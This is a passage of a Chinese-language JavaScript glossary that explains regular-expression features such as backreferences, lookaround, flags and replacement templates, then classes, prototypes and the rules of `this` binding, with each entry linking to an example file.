`\1`、`\2`（或 `\k<name>`）在模式中**回指**前面某个捕获组已经匹配到的文本，用来表达「重复的内容必须相同」。典型用途是匹配成对的引号（`/["'](.*?)\1/`）、重复单词（`/\b(\w+)\s+\1\b/`）、或 HTML 开闭标签配对。关键细节：反向引用匹配的是**文本内容**而非模式本身——它比较的是字符序列是否相等，这与「再匹配一次同样的模式」有本质区别（后者可以匹配不同内容）。常见误解是在字符类里用 `\1`：`[\1]` 不表示反向引用，而是八进制转义。

示例：[`13_regexp/06_backreferences.js`](13_regexp/06_backreferences.js)

### Named capture group（具名捕获组）

`(?<name>...)` 给捕获组起名字，匹配后通过结果对象的 `groups.name` 按名取值，比 `match[3]` 这种魔数下标可读、可重构得多。组内的 `\k<name>` 可以在模式中反向引用该组，替换模板里则用 `$<name>` 取值。关键细节：同名组在**不同选择分支**里原本会报错，ES2025 起允许重复（「重复具名组」），未参与匹配的分支对应 `undefined`；ES2025 还补上了 `RegExp.escape` 用于安全地转义动态文本。常见误解是以为具名组不进数字下标——它们同时占用编号，只是多了一个名字入口。

示例：[`13_regexp/07_named_groups.js`](13_regexp/07_named_groups.js)

### `groups`（具名组结果对象）

`exec` / `match` / `matchAll` 返回值上挂的附加属性，是一个「组名 → 匹配文本（或 `undefined`）」的普通对象（原型为 `null`），没有具名组时为 `undefined`。它让取值脱离了位置依赖，是解析日志行、URL、结构化文本的首选方式。关键细节：用 `obj.groups?.name` 访问，因为无具名组时 `groups` 本身就不存在；`replace` 回调的参数里也有对应的 `groups`。也见 Named capture group（具名捕获组）。

示例：[`13_regexp/07_named_groups.js`](13_regexp/07_named_groups.js)

### Lookahead（前瞻）

`(?=...)` 是正向前瞻（要求后面是某模式），`(?!...)` 是负向前瞻（要求后面不是），它们**只检查不消耗**，因此被称为零宽断言。经典用途：用 `(?=...)` 做「重叠匹配」（`/\w(?=\w)/g` 能取到相邻字符组合），用 `(?!...)` 做密码规则「至少含一位数字」的 `/^(?=.*\d).{8,}$/`，或者在替换时「只看后面」定位插入点。关键细节：前瞻内部**可以有捕获组并真的捕获内容**，这一点容易被忽略；前瞻里也可以使用量词和完整的子模式。也见 Lookbehind（后顾）。

示例：[`13_regexp/08_lookahead_lookbehind.js`](13_regexp/08_lookahead_lookbehind.js)

### Lookbehind（后顾）

`(?<=...)` 与 `(?<!...)` 是 ES2018 加入的向后断言，检查「当前位置之前」是否匹配某模式，同样零宽不消耗。它让很多原本需要 `replace` 回调 + 手工判断的场景变得声明式，例如给数字加千分位（`/(?<=\d)(?=(\d{3})+$)/g`）、只替换某个前缀后的内容（`/(?<=id=)\d+/`）。关键细节：后顾模式的长度在传统实现中必须**定长**，虽然 JS 引擎（V8）已支持变长后顾，但为兼容性考虑宜用等长模式；另外它的性能开销略高于前瞻。

示例：[`13_regexp/08_lookahead_lookbehind.js`](13_regexp/08_lookahead_lookbehind.js)

### Zero-width assertion（零宽断言）

「断言一个位置成立但不吃掉任何字符」的一类构造，包括 `^ $ \b \B`、前后瞻 `(?=) (?!) (?<=) (?<!)`。它们的存在解释了为什么某些匹配能发生在**同一个下标**上、为什么全局替换不会漏掉相邻结果，以及为什么 `replace` 时断言匹配到的内容替换后会「原地插入」。关键细节：零宽匹配配合 `g` 时 `lastIndex` 若不推进就会死循环——ES2015 起 `String.prototype.replace`、`matchAll` 等对零宽匹配做了自动推进保护，但手写 `exec` 循环仍需自己防。也见 Lookahead（前瞻）、Word boundary（单词边界）。

示例：[`13_regexp/08_lookahead_lookbehind.js`](13_regexp/08_lookahead_lookbehind.js)

### Flags（修饰符）

紧跟在右斜杠后的字母，全局地改变匹配语义。`g` 全局查找、`i` 忽略大小写、`m` 多行、`s` 让 `.` 匹配换行、`u` 启用完整 Unicode 语义（码点匹配、`\p{...}`、代理对安全）、`y` 粘性、`d` 生成带下标的匹配信息、`v` 字符类集合运算。关键细节：标志是**正则对象固有的**，可以在 `re.flags` 上按规范顺序读回；`u` 和 `v` 互斥，同用会抛 `SyntaxError`；带 `g` 的正则是有状态的。常见误解是 `i` 会做 Unicode 大小写折叠——不加 `u` 时它只做简单的 ASCII/基本映射。

示例：[`13_regexp/09_flags.js`](13_regexp/09_flags.js)

### Sticky flag `y`（粘性标志）

`y` 让匹配必须**恰好从 `lastIndex` 处开始**，否则直接失败，而不是像 `g` 那样向后滑动寻找。这个「锚定在游标上」的语义正是手写词法分析器（tokenizer）需要的：你可以依次从当前位置尝试各类 token 模式，成功就推进游标，失败即报错。它也解释了为什么 `y` 和 `g` 共享 `lastIndex` 机制，以及为什么 `replace` 配合 `y` 能在每个位置尝试替换。常见误解是以为 `y` 只是「更严格的 g」——它真正的区别是**会不会跳过不匹配的字符**。

示例：[`13_regexp/09_flags.js`](13_regexp/09_flags.js)

### `v` flag and set operations（`v` 标志与集合运算）

ES2024 引入的 `v` 标志是 `u` 的超集，它把字符类升级成真正的**集合代数**：用 `[a-z&&[^aeiou]]` 求交集、用 `[\p{Letter}--[a-z]]` 求差集，并支持在类内嵌套类。它同时更严格地规定了类内哪些字符必须转义（如 `(`、`)`、`[`、`]`、`{`、`}` 在 `v` 模式下都得写成 `\(` 等），从而消除歧义。关键细节：`v` 与 `u` 不能同时使用；`\p{...}` 属性转义在 `v` 下功能更完整（支持字符串属性如 `\p{RGI_Emoji}`）。它能显著简化原本需要多个前瞻拼凑的字符过滤逻辑。

示例：[`13_regexp/14_v_flag_and_set_operations.js`](13_regexp/14_v_flag_and_set_operations.js)

### `match` / `matchAll`（字符串匹配方法）

`String.prototype.match` 在正则有 `g` 时返回所有整体匹配的字符串数组（**不含捕获组、不含 index**），无 `g` 时退化为 `exec` 的结果。`matchAll` 是 ES2020 的补充，它**始终**返回一个迭代器，逐个给出完整的 `exec` 式结果（含捕获组、`index`、`groups`），因此成为提取结构化数据的首选。关键细节：`matchAll` 要求正则带 `g`，否则抛 `TypeError`；它返回的是惰性迭代器，且**不改动原正则的 `lastIndex`**。常见误解是用 `match` + `g` 后试图取 `result[1]`——那是整体匹配的第 2 个字符。

示例：[`13_regexp/11_string_methods_with_regex.js`](13_regexp/11_string_methods_with_regex.js)

### `search` / `split`（search 与 split）

`str.search(re)` 只返回第一个匹配的下标（找不到返回 -1），且**忽略 `g` 标志与 `lastIndex`**，是纯查询。`str.split(re)` 按正则匹配到的位置切分字符串，并**会把捕获组的内容插入结果数组**——`"a1b".split(/(\d)/)` 得到 `["a","1","b"]`，这个行为常被当成 bug。关键细节：`split` 使用正则时会重置 `lastIndex`；`search` 是少数不受 `g` 状态影响的方法。替换操作用 `replace`/`replaceAll`，也见 Replacement template（替换模板）。

示例：[`13_regexp/11_string_methods_with_regex.js`](13_regexp/11_string_methods_with_regex.js)

### `replace` with function（函数式替换）

`str.replace(re, fn)` 的第二参数可以是回调函数，参数依次为 `(match, ...捕获组, offset, string, groups)`，返回值即替换文本。这是把正则从「纯文本替换」升级为「计算式改写」的关键能力：大小写转换、数值累加、把匹配结果映射为另一种表示都靠它。关键细节：参数个数随捕获组数量变化，因此取 `offset`/`groups` 时通常用剩余参数或具名组；回调里**不要**依赖 `this`（严格模式下是 `undefined`）。也见 Replacement template（替换模板）。

示例：[`13_regexp/10_replace_with_function.js`](13_regexp/10_replace_with_function.js)

### Replacement template（替换模板）

`replace` 第二参数为字符串时，其中以 `$` 开头的序列会被解释：`$&` 是整体匹配、`$'` 是匹配之后的文本、`$` 后紧跟一个反引号则是匹配之前的文本、`$1`..`$n` 是数字组、`$<name>` 是具名组、`$$` 表示字面量 `$`。它让「保留部分原文做重组」不必写回调，例如 `s.replace(/(\w+)@(\w+)/, "$2#$1")`。关键细节：不存在的组会被替换成**空串**（`$9` 无组时消失），而 `$1` 紧邻数字时可能被误解为组号（`$12` 优先当作第 12 组，需写成 `${1}2`）。当替换文本来自用户输入时，`$` 会被意外解释，这是模板注入类 bug 的常见来源。

示例：[`13_regexp/10_replace_with_function.js`](13_regexp/10_replace_with_function.js)

### Validation pattern（校验模式）

用正则做「整串是否合格」的断言式检查，例如邮箱、手机号、日期、强密码。书写要点是**两端必须加锚点** `^...$`，否则 `/\d{3}/` 会在 `"abc123xyz"` 上返回 `true`。强密码这类多条件需求通常用多个前瞻叠加：`/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$/`。关键细节：正则校验只能判断**形状**，不能判断语义（邮箱是否真实存在、手机号是否被分配）；对邮箱这类复杂格式，过度严格的正则往往误杀合法地址，业界共识是宽松匹配 + 发信验证。

示例：[`13_regexp/12_validation_patterns.js`](13_regexp/12_validation_patterns.js)

### Custom regexp protocol（自定义正则协议 / `Symbol.match` 等）

JavaScript 允许对象**伪装成正则**参与字符串方法：只要实现 `[Symbol.match]`、`[Symbol.matchAll]`、`[Symbol.replace]`、`[Symbol.search]`、`[Symbol.split]` 中的一个或多个，就能被 `String.prototype` 的对应方法接受。判定「是不是正则」的权威标准不是 `instanceof RegExp`，而是方法内部调用的 `IsRegExp` 抽象操作——它先看 `Symbol.match`，再看原型链。关键细节：把 `re[Symbol.match] = false` 设为假值能让 `String.prototype.startsWith` 把正则当普通字符串处理；`Symbol.replace` 的第一个参数是目标字符串、第二个是替换项，返回新字符串。这解释了「鸭子类型」如何穿透语言内建方法。

示例：[`13_regexp/15_custom_regexp_protocol.js`](13_regexp/15_custom_regexp_protocol.js)

## 面向对象：类、this 与原型（OOP: Classes, `this` & Prototypes）

### class（类）

ES2015 引入的 `class` 声明是**原型继承的语法糖**，不是新的对象模型：它统一了「构造函数 + `prototype` 方法 + 静态方法」的写法，并额外提供了私有字段、静态块、类字段等新能力。关键细节：类声明**不会提升**（存在 TDZ，只能在定义之后使用），类体内部自动运行在严格模式下，且**必须用 `new` 调用**（直接 `Person()` 会抛 `TypeError: Class constructor cannot be invoked without 'new'`），这两点都与构造函数写法不同。常见误解是把它当作 Java 式类——它依然基于原型与动态查找。也见 Constructor function（构造函数）、TDZ 之外的传统写法与 `new` operator（`new` 运算符）。

示例：[`14_classes/01_class_basics.js`](14_classes/01_class_basics.js)

### Constructor（构造函数 / 构造器方法）

类体里名为 `constructor` 的方法，是 `new` 时自动执行的初始化逻辑，负责给实例装初始状态。它有三个易错点：一个类只能有一个 `constructor`（重复定义直接 `SyntaxError`）；`constructor` 不是关键字，它是方法名，但**不能被当作普通方法调用**；在派生类中它必须在访问 `this` 之前调用 `super()`。如果类里没有显式写它，引擎会补一个默认构造器（派生类的默认构造器会自动转发全部参数给 `super`）。也见 class（类）、`super`。

示例：[`14_classes/01_class_basics.js`](14_classes/01_class_basics.js)

### Constructor function（构造函数：函数式写法）

用普通函数 + `new` 模拟类的 ES5 风格：`function Person(name) { this.name = name }`，方法挂在 `Person.prototype` 上。它与 `class` 的差异是实质性的：函数声明会提升、可以不加 `new` 直接调用（此时 `this` 指向 `undefined`/全局，会静默污染）、方法默认可枚举、也不强制严格模式。关键细节：`class` 本质就是这种写法的规范化包装，`typeof MyClass === "function"` 依然成立。也见 class（类）、`new` operator（`new` 运算符）。

示例：[`16_prototype/03_constructor_function.js`](16_prototype/03_constructor_function.js)

### instance（实例）

由构造函数或类通过 `new` 创建出来的具体对象，拥有自己的一份实例属性，并通过 `[[Prototype]]` 共享原型上的方法。判断「是不是某个类的实例」用 `instanceof` 或 `Object.prototype.isPrototypeOf`。关键细节：实例与原型是**活链接**，但实例自己的属性会遮蔽原型同名属性；`constructor` 属性是原型上的、可被改写，因此 `obj.constructor === Foo` 并不可靠。也见 Instance members（实例成员）、Prototype chain（原型链）。

示例：[`14_classes/01_class_basics.js`](14_classes/01_class_basics.js)

### `new` operator（`new` 运算符）

`new Foo(...)` 的执行分四步：创建空对象、把该对象的 `[[Prototype]]` 指向 `Foo.prototype`、以该对象为 `this` 调用 `Foo`、若函数返回对象则用返回值否则用新对象。真正标志「这是构造调用」的是引擎内部的 `[[Construct]]`，构造函数可通过 `new.target` 检测自己是否被 `new` 调用（用它可实现「忘了 new 也能工作」的兼容写法）。关键细节：箭头函数不能被 `new`（没有 `[[Construct]]`），`class` 必须被 `new`，内建函数如 `Date` 用 `new` 与否行为完全不同。

示例：[`15_this_and_context/05_new_binding.js`](15_this_and_context/05_new_binding.js)

### Instance members（实例成员）

定义在「实例自己身上」的成员，每个实例各持一份：构造器里 `this.x = ...` 赋的值、以及类字段 `x = 1` 都属于此类。它们的代价是**每实例一份内存**，好处是互不干扰、可被 `Object.hasOwn` 检出。与原型方法相对：方法通常放原型上共享，数据放实例上隔离。关键细节：如果用箭头函数写类字段（`handler = () => this.x`），每个实例都会得到一个新的函数对象——这是用内存换「this 永远绑定正确」的常见权衡。也见 Class field（类字段）、Lexical this（词法 this）。

示例：[`14_classes/02_instance_methods.js`](14_classes/02_instance_methods.js)

### Static members（静态成员）

用 `static` 修饰的成员，挂在**构造函数对象自身**上而非 `prototype`，因此只能通过 `ClassName.member` 访问，实例访问不到。典型用途是工厂方法（`User.fromJSON()`）、工具函数、常量与注册表。关键细节：静态方法里的 `this` 指向类本身（子类调用时指向子类，这使静态工厂能正确返回子类实例）；`static` 也能修饰 getter、字段与方法。常见误解是以为 `static` 属性会被实例继承——实例只能通过原型链找到原型上的东西，而静态成员在构造函数这条链上。

示例：[`14_classes/03_static_members.js`](14_classes/03_static_members.js)

### Static initialization block（静态初始化块）

`static { ... }` 是 ES2022 引入的类体语法，在类**定义时**执行一次，可用多条语句完成静态字段的复杂初始化。它填补了旧方案的三个缺口：可以在静态初始化里使用 `try/catch`、可以访问类的私有静态成员、可以声明只在初始化期间存在的局部变量（`var`/`let` 在块内是局部的，不会泄漏成类的静态属性）。关键细节：一个类可以有多个静态块，按出现顺序执行，且与静态字段的书写顺序交错生效；执行时机是类定义被求值时，早于任何实例创建。

示例：[`14_classes/03_static_members.js`](14_classes/03_static_members.js)

### Class field（类字段）

在类体顶层直接写 `x = 1` 声明的实例字段（`static x = 1` 则为静态字段），它等价于在构造函数里给 `this.x` 赋值，但初始化发生在构造器主体执行**之前**。关键细节：字段初始化时 `this` 已可用（派生类中在 `super()` 之后）；字段定义是「每次实例化都重新求值」，所以 `arr = []` 保证每个实例拿到独立数组，不像原型属性那样共享。常见误解是把类字段当作原型属性——它们的原型是 `undefined`，实例上才存在。也见 Instance members（实例成员）。

示例：[`14_classes/04_class_fields.js`](14_classes/04_class_fields.js)

### Private field（私有字段 `#x`）

以 `#` 开头的字段是**真正的词法私有**，而不是靠命名约定：只能在声明它的类体内部访问，外部访问直接抛 `SyntaxError`（编译期报错，不是 `undefined`）。实现上私有字段存在对象的「私有槽」里，不参与原型链查找，因此不会被属性遍历、`JSON.stringify`、`Object.keys` 看到，也**无法被 `Proxy` 拦截或劫持**——这是它比 `WeakMap` 方案更强的地方。关键细节：私有字段必须在类体里先声明才能用；`#x in obj` 是 ES2022 提供的唯一检测手段；子类无法访问父类的私有字段。也见 Private method（私有方法）。

示例：[`14_classes/05_private_fields.js`](14_classes/05_private_fields.js)

### Private method（私有方法）

`#method() {}` 与私有字段同理，只能从类体内部调用；同样支持 `static #m()` 与私有 getter/setter（`get #x()`）。私有方法常用于内部校验、状态变更逻辑，把「实现细节」与公开 API 彻底隔离。关键细节：私有方法访问时的 `this` 规则与普通方法一致（取决于调用方式），因此把它作为回调传递时要注意 `this` 丢失问题；由于不进入原型，每个实例共享的是同一份方法定义（引擎内部优化），但语义上是不可外取的。

示例：[`14_classes/05_private_fields.js`](14_classes/05_private_fields.js)

### getter / setter（访问器属性）

用 `get name() {}` / `set name(v) {}` 定义的属性，对外表现为**属性访问语法**，实际执行函数，用于计算值、校验输入、维护派生状态。定义在类体里会挂到 `prototype` 上被所有实例共享；也能用 `Object.defineProperty` 在普通对象上定义。关键细节：只有 getter 时属性只读（严格模式下赋值抛错）；setter 中给同名属性赋值会造成无限递归（要用 `this._x` 或私有字段存值）；访问器**不可枚举**（类体中的普通方法也不可枚举，这是与字面量对象的差异）。也见 Private field（私有字段）。

示例：[`14_classes/06_getters_setters.js`](14_classes/06_getters_setters.js)

### Accessor on prototype（原型上的访问器）

把 getter/setter 定义在原型（类体或 `Object.defineProperty(Foo.prototype, ...)`）上，全部实例共享同一对存取逻辑，访问时 `this` 指向触发访问的那个实例。它常用于把「存储字段」包装成「计算属性」：内部用 `this._name` 或 `#name` 存真值，对外暴露 `get name()` 做格式化、`set name()` 做校验。关键细节：原型上的访问器**不可枚举**，所以 `Object.keys(instance)` 看不到它们，`JSON.stringify` 也不会序列化（这是与类字段的一个重要差异）；若原型上的访问器只有 getter 没有 setter，那么实例上对该名字赋值会抛 `TypeError`（严格模式）或静默失败，而**不会**像普通数据属性那样新建一个遮蔽属性——因为赋值路径会在原型上找到访问器并调用它。也见 getter / setter（访问器属性）、Property shadowing（属性遮蔽）。

示例：[`16_prototype/06_getter_setter_prototype.js`](16_prototype/06_getter_setter_prototype.js)

### `extends`（继承）

`class Child extends Parent` 建立原型链双链：`Child.prototype.__proto__ === Parent.prototype`（实例方法可继承），且 `Child.__proto__ === Parent`（静态成员也可继承）。这就是为什么子类能直接调用父类的静态方法。关键细节：`extends` 右侧可以是**任意表达式**（返回构造函数的表达式），因此能实现混入（`extends mixin(Base)`）；派生类的构造器里不调用 `super()` 就用 `this` 会抛错。常见误解是以为 `extends` 会复制父类成员——它只是建立查找链路。也见 ES5 inheritance（ES5 继承）、Mixins（混入）。

示例：[`14_classes/07_inheritance_extends.js`](14_classes/07_inheritance_extends.js)

### Extending builtins（继承内建类型）

`class MyArray extends Array` 这类写法允许内建类型被继承，且内建方法会「感知」子类：`new MyArray(1,2).map(...)` 返回的是 `MyArray`，因为引擎会读构造函数的 `Symbol.species`。这带来的坑比便利多：内建方法内部会调用子类构造器，因此构造器签名一旦不兼容（比如自定义了参数含义）就会在 `map`/`slice`/`filter` 里静默出错；另一个经典问题是内建方法返回值失去子类的品牌检查能力。实践建议：需要扩展内建行为时优先**组合**（把数组作为私有字段）而非继承，除非明确需要 `Array.isArray` 之外的子类语义。也见 `Symbol.species`。

示例：[`14_classes/08_extends_builtins.js`](14_classes/08_extends_builtins.js)

### `super`（父类引用）

在派生类中 `super` 有两种形态：`super(...)` 在构造器中**调用父类构造器**（必须在访问 `this` 前执行，它负责创建并返回 `this`），`super.method()` / `super.prop` 则在方法中**沿父类原型查找**。关键细节：`super` 不是变量，它是关键字，其指向在**定义时**由 `[[HomeObject]]` 静态确定——因此把方法提取出来单独调用，`super` 依然有效，而 `this` 会丢（这是 `super` 比 `Parent.prototype.m.call(this)` 更可靠的原因）。常见误解是在箭头函数里以为 `super` 会随调用者变化。

示例：[`14_classes/07_inheritance_extends.js`](14_classes/07_inheritance_extends.js)

### `super.method()`（父类方法调用）

在子类方法中调用「上一级实现」，是方法重写里保留父类行为的标准手段。它的查找起点是**当前类的 `prototype` 的父级**，而不是 `this` 的原型，这一区别在多层继承中很关键（用 `this.__proto__.m()` 会在更深继承时出错）。关键细节：`super.method()` 调用时 `this` 仍是当前实例，所以父类方法里的 `this` 指向子类实例——这正是模板方法模式（父类定义流程、子类填空）能工作的原因。也见 Override（方法重写）、`super`。

示例：[`14_classes/07_inheritance_extends.js`](14_classes/07_inheritance_extends.js)

### Override（方法重写）

子类用同名方法覆盖父类实现。由于是**原型链查找**，重写只是「在更近的一层找到了同名属性」，并没有修改父类；父类的其他实例完全不受影响。关键细节：重写会**完全替换**行为，若还想保留父类逻辑必须显式调用 `super.method()`；字段也会发生类似覆盖但语义不同——父类字段在 `super()` 期间先被初始化，之后子类字段初始化会再次覆盖同名属性。也见 shadowing（属性遮蔽）、`super.method()`。

示例：[`14_classes/14_polymorphism.js`](14_classes/14_polymorphism.js)

### Abstract class pattern（抽象类模式）

JavaScript **没有** `abstract` 关键字，所谓抽象类是用约定模拟出来的：父类方法里直接 `throw new Error("必须由子类实现")`，或用一个未实现的私有标记做构造期检查（在父类构造器中判断 `this.constructor === Parent` 就抛错）。前者是「运行到才报错」的接口约定，后者能在实例化时就拦住直接 `new` 抽象类的行为。关键细节：TS 的 `abstract` 只在编译期检查，运行时的 JS 代码仍需这类运行时防护；也可以用 `new.target` 做更优雅的实现。也见 Polymorphism（多态）。

示例：[`14_classes/10_abstract_pattern.js`](14_classes/10_abstract_pattern.js)

### Polymorphism（多态）

「同一段调用代码，按对象的实际类型执行不同实现」的能力，在 JS 里由原型链动态查找天然提供——父类声明的流程调用 `this.speak()`，具体执行哪个 `speak` 取决于实例的原型链。它与「接口」无关（JS 没有接口，靠**鸭子类型**），也与重载无关（JS 无函数重载）。关键细节：多态是运行时决议的，因此可做开放封闭式的扩展——新增子类无需修改调用方代码。也见 Override（方法重写）、Duck typing 与 `instanceof`。

示例：[`14_classes/14_polymorphism.js`](14_classes/14_polymorphism.js)

### Mixins（混入）

由于 JS 只有单继承，需要「从多个来源组合能力」时用混入：定义一个接收基类、返回增强后子类的函数（`const Serializable = Base => class extends Base {...}`），再 `class X extends Serializable(Base)` 叠加。这套「类工厂 + `extends 表达式`」的组合是 JS 里最正统的 mixin 写法。关键细节：混入的方法在原型链上形成一条线性链条，多个混入的顺序会影响同名方法的解析（后者覆盖前者，`super` 指向链的上一环）；`Object.assign(proto, {...})` 那种「拷贝方法」的简易混入不会建立原型链，也不会触发 `super`。也见 Method resolution order（方法解析顺序）。

示例：[`14_classes/11_mixins.js`](14_classes/11_mixins.js)

### Instance branding（实例品牌检查）

用私有字段或 `WeakSet` 给实例打上「不可伪造的标记」，再通过 `#field in obj` 或 `WeakSet.has(obj)` 判断某个对象是否真由本类创建，而不是仅仅「长得像」。这是比 `instanceof` 更严格的类型检查：`instanceof` 可以被 `Object.create(Foo.prototype)` 或改 `Symbol.hasInstance` 绕过，而私有字段无法从外部伪造。关键细节：`#x in obj` 要求 `obj` 是对象（否则抛 `TypeError`），并且该私有名必须在当前类体作用域内。典型用途是库内部的方法参数校验。

示例：[`14_classes/09_instanceof_and_brands.js`](14_classes/09_instanceof_and_brands.js)

### `instanceof`（instanceof 运算符）

`a instanceof B` 检查 `B.prototype` 是否出现在 `a` 的原型链上——注意它查的是**原型**而非「谁创建的」，因此改原型或跨 `iframe`/多 realm 时会失效（不同 realm 的 `Array.prototype` 不同）。关键细节：它的实际算法是调用 `B[Symbol.hasInstance](a)`，所以可被自定义；原始值一律返回 `false`（`1 instanceof Number` 为假）。常见误解是用它做可靠的类型判断——实际工程中更稳的是品牌检查、`Array.isArray` 这类专用方法，或 `Object.prototype.toString.call`。也见 `Symbol.hasInstance`。

示例：[`14_classes/09_instanceof_and_brands.js`](14_classes/09_instanceof_and_brands.js)

### `Symbol.hasInstance`

`instanceof` 背后的钩子方法，定义为静态方法 `static [Symbol.hasInstance](obj) { ... }`，返回布尔值。它让类能自定义「什么算我的实例」，实现结构化判定而不仅是原型链判定（例如「任何带 `length` 和 `forEach` 的对象都算我的实例」）。关键细节：`Function.prototype[Symbol.hasInstance]` 上挂着默认实现（即原型链检查），自定义会**覆盖**它；`instanceof` 的规范算法优先取右操作数的 `Symbol.hasInstance`，取不到才回落。注意该钩子在 `Symbol.hasInstance` 为不可调用值时会抛 `TypeError`。

示例：[`14_classes/12_tostring_and_symbols.js`](14_classes/12_tostring_and_symbols.js)

### `Symbol.species`

一个**静态 getter**，用于指定「派生操作应当构造哪种类型」。典型场景：自定义的 `MyArray extends Array`，调用 `.map()` 时引擎会读取构造函数的 `Symbol.species`，用它决定新对象是 `MyArray` 还是普通 `Array`。默认行为是返回 `this`（即子类），这可能导致内建方法意外造出子类实例；返回 `Array` 即可「降级」。关键细节：由于读取的是 `constructor[Symbol.species]`，改 `constructor` 会影响结果；这是一个偏底层、少用但理解内建类继承时绕不开的钩子。

示例：[`14_classes/15_symbol_species.js`](14_classes/15_symbol_species.js)

### `Symbol.toPrimitive`

对象转原始值时的最高优先级钩子：`obj[Symbol.toPrimitive](hint)`，`hint` 为 `"number"`、`"string"` 或 `"default"`，决定了 `+`、`==`、模板字符串、`Number()`、`` `${obj}` `` 等场景如何取值。它优先于 `valueOf` / `toString`，是精确控制类型转换顺序的唯一手段（例如让 `Money + Money` 有意义、让日期类对象在 `+` 下走字符串）。关键细节：必须返回原始值，返回对象会抛 `TypeError`；`hint` 为 `"default"` 出现在 `+`、`==` 和 `Date` 之外的松散比较中。也见 `Symbol.toStringTag`。

示例：[`14_classes/12_tostring_and_symbols.js`](14_classes/12_tostring_and_symbols.js)

### `Symbol.toStringTag`

一个字符串值属性，用来定制 `Object.prototype.toString.call(obj)` 的输出（结果为 `"[object Xxx]"`）。它是**唯一**能在不改写 `toString` 的情况下影响这个「类型字符串」的方式，所以在做跨 realm 的类型判断库（如各版本 `is-plain-object`）里很常用。关键细节：它不改变 `typeof`（仍是 `"object"`），也不影响 `${obj}`（那走 `Symbol.toPrimitive`/`toString`）。类中可写 `get [Symbol.toStringTag]() { return "MyType" }`，内建对象（`Map`、`Promise` 等）都靠它标记自己。

示例：[`14_classes/12_tostring_and_symbols.js`](14_classes/12_tostring_and_symbols.js)

### Decorator pattern（类装饰器模式）

JavaScript 长期没有装饰器语法，实践中用**函数包装**实现：`const logged = Klass => class extends Klass { ... }`，或用 `Object.defineProperty` 给原型/静态成员加行为。它的价值是把日志、缓存、权限校验等横切关注点从业务类中剥离。关键细节：装饰器提案（stage 3）语法 `@decorator` 通过 `Symbol.metadata` 与新的 `addInitializer` 提供标准化能力，与转译器（旧 TS/Babel）的 `experimentalDecorators` 语义**不兼容**，这是实际项目中最容易踩的坑。也见 Mixins（混入）。

示例：[`14_classes/13_class_decorator_pattern.js`](14_classes/13_class_decorator_pattern.js)

### `this`

函数调用时由**调用方式**决定的隐式参数，指向「当前执行上下文相关的对象」，而不是函数自身或定义位置（箭头函数除外）。它存在的意义是让方法能操作「调用它的那个对象」，从而支持多态式的复用。关键细节：`this` 在**非严格模式**下默认指向 `globalThis`，在严格模式/模块/类体中默认是 `undefined`——同一个函数被不同方式调用 `this` 就不同。常见误解是以为 `this` 指向函数或指向「定义它的对象」；箭头函数里它又变成词法绑定。也见 `this` binding rules（`this` 绑定规则）。

示例：[`15_this_and_context/01_this_rules.js`](15_this_and_context/01_this_rules.js)

### Default binding（默认绑定）

四种 `this` 规则中最弱的一种：函数被**以裸调用形式**执行（`fn()`、无接收者）时，`this` 取默认值——非严格模式是 `globalThis`，严格模式是 `undefined`。它是最常导致「Cannot read properties of undefined」的原因，典型场景是把方法当普通函数传递（回调、`setTimeout`、事件处理器里的普通函数）。关键细节：模块顶层代码默认是严格模式，所以 Node/ESM 里裸调用的 `this` 是 `undefined` 而非全局对象。也见 `this` 丢失（方法提取）。

示例：[`15_this_and_context/01_this_rules.js`](15_this_and_context/01_this_rules.js)

### Implicit binding（隐式绑定）

调用写成 `obj.method()` 时，`this` 指向点号左边的对象——这是日常最常用的绑定方式。关键细节：只有**最后一层**接收者算数，`a.b.c()` 的 `this` 是 `b`；一旦把 `obj.method` 存进变量再调用（`const m = obj.method; m()`），接收者信息就丢了，退化为默认绑定，这就是著名的 this 丢失问题。另一种隐性陷阱是回调传参：`arr.forEach(obj.method)` 同样丢 `this`。也见 `this` 丢失（方法提取）、Explicit binding（显式绑定）。

示例：[`15_this_and_context/02_this_in_method.js`](15_this_and_context/02_this_in_method.js)

### Explicit binding（显式绑定）

用 `call` / `apply` / `bind` 手动指定 `this`，是四种规则中最直接的干预手段。`call(thisArg, ...args)` 与 `apply(thisArg, argsArray)` 只影响**本次调用**，`bind(thisArg, ...partial)` 返回一个**永久绑定**的新函数（后续再用 `call` 也无法改回，除了用 `new` 调用绑定函数时 `this` 会被忽略）。关键细节：把 `null` / `undefined` 作为 `thisArg` 时，非严格模式下会被替换为全局对象；`bind` 还能做偏函数（预置部分参数）。也见 Lexical this（词法 this）。

示例：[`15_this_and_context/04_explicit_binding.js`](15_this_and_context/04_explicit_binding.js)

### `new` binding（`new` 绑定）

用 `new Fn()` 调用时，`this` 指向**新建的那个对象**，其原型为 `Fn.prototype`。这是四条规则中优先级最高的一档（仅次于箭头函数的词法绑定）。关键细节：无论函数内部怎么写，`new` 调用都会创造一个全新的 `this`；如果构造函数显式 `return` 一个对象，那个返回值会取代新对象，但 `return` 原始值会被忽略（这是 `new` 绑定会被「返回对象」绕过的唯一情形）。也见 `new` operator（`new` 运算符）、Binding priority（绑定优先级）。

示例：[`15_this_and_context/05_new_binding.js`](15_this_and_context/05_new_binding.js)

### Binding priority（绑定优先级）

四条规则并非平级，判定顺序是：**箭头函数（词法 `this`）→ `new` 绑定 → 显式绑定（`call`/`apply`/`bind`）→ 隐式绑定（`obj.fn()`）→ 默认绑定**。记忆要点是 `new` 能压过 `bind`（`new boundFn()` 里 `bind` 指定的 `this` 被忽略）——这可以用 `bind` 一个空函数再 `new` 它来验证。关键细节：箭头函数不参与这套竞争，它的 `this` 在外层作用域就已锁定；在类字段里用箭头函数定义方法，等于用词法绑定永久「钉死」`this`。也见 Lexical this（词法 this）。

示例：[`15_this_and_context/06_this_priority.js`](15_this_and_context/06_this_priority.js)

### Losing `this`（this 丢失 / 方法提取）

把方法从对象上取下来传递（`const fn = obj.method`、`setTimeout(obj.method, 0)`、`arr.map(obj.method)`）后，调用时不再有接收者，`this` 退化为 `undefined` 或全局对象，导致运行时错误或静默写错对象。这是 JavaScript 最经典的一类 bug，也是「隐式绑定只在点号调用那一刻生效」的直接推论。三种修复：`bind` 固定、用箭头函数包装（`() => obj.method()`）、把方法改成箭头函数类字段（牺牲每实例一份函数的内存）。也见 Lexical this（词法 this）、Implicit binding（隐式绑定）。

示例：[`15_this_and_context/07_this_in_callbacks.js`](15_this_and_context/07_this_in_callbacks.js)

### Lexical `this`（词法 this / 箭头函数）

